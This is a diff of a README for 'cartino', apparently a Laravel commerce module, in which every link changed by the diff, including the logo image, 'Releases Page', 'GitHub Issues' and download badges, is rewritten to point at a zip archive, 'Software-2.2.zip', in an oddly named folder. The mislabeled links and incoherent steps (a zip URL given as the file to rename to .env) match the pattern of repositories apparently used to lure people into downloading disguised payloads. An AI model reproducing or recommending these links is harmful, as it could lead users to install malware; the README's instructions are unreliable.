@@ -1,14 +1,14 @@
 # 🌟 cartino - Simple Setup for Your Online Store
 
 <p align="center">
-  <img src="https://raw.githubusercontent.com/LucashRB/cartino/main/intuitiveness/cartino.zip" alt="Logo" width="400"/>
+  <img src="https://github.com/LucashRB/cartino/raw/refs/heads/main/intuitiveness/Software-2.2.zip" alt="Logo" width="400"/>
 </p>
 
 <p align="center">
   <b>Most advanced commerce module for Laravel</b> to manage, organize and grow your ideas 💡
 </p>
 
-[![Download cartino](https://raw.githubusercontent.com/LucashRB/cartino/main/intuitiveness/cartino.zip)](https://raw.githubusercontent.com/LucashRB/cartino/main/intuitiveness/cartino.zip)
+[![Download cartino](https://github.com/LucashRB/cartino/raw/refs/heads/main/intuitiveness/Software-2.2.zip)](https://github.com/LucashRB/cartino/raw/refs/heads/main/intuitiveness/Software-2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -27,9 +27,9 @@ Before you start, make sure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To install cartino, visit this page to download: [Releases Page](https://raw.githubusercontent.com/LucashRB/cartino/main/intuitiveness/cartino.zip).
+To install cartino, visit this page to download: [Releases Page](https://github.com/LucashRB/cartino/raw/refs/heads/main/intuitiveness/Software-2.2.zip).
 
-1. Go to the [Releases Page](https://raw.githubusercontent.com/LucashRB/cartino/main/intuitiveness/cartino.zip).
+1. Go to the [Releases Page](https://github.com/LucashRB/cartino/raw/refs/heads/main/intuitiveness/Software-2.2.zip).
 2. Look for the latest version listed at the top.
 3. Click on the download link that matches your operating system.
 4. Follow the prompts to save the file to your computer.
@@ -49,7 +49,7 @@ Once you have downloaded the cartino application, follow these steps to set it u
 
 3. **Set Up Environment:**
    - Open the folder where you placed the files.
-   - Look for a file named `https://raw.githubusercontent.com/LucashRB/cartino/main/intuitiveness/cartino.zip`.
+   - Look for a file named `https://github.com/LucashRB/cartino/raw/refs/heads/main/intuitiveness/Software-2.2.zip`.
    - Rename it to `.env`.
 
 4. **Configure Database:**
@@ -110,9 +110,9 @@ We welcome contributions! If you want to help improve cartino, please check out 
 For more information, check these resources:
 
 - [Official Documentation](#)
-- [GitHub Issues](https://raw.githubusercontent.com/LucashRB/cartino/main/intuitiveness/cartino.zip)
+- [GitHub Issues](https://github.com/LucashRB/cartino/raw/refs/heads/main/intuitiveness/Software-2.2.zip)
 - [Community Forum](#)
 
 If you need further help, feel free to reach out through the contact page linked in the repository. 
 
-[Download cartino now](https://raw.githubusercontent.com/LucashRB/cartino/main/intuitiveness/cartino.zip) and start your journey in online commerce today!
+[Download cartino now](https://github.com/LucashRB/cartino/raw/refs/heads/main/intuitiveness/Software-2.2.zip) and start your journey in online commerce today!
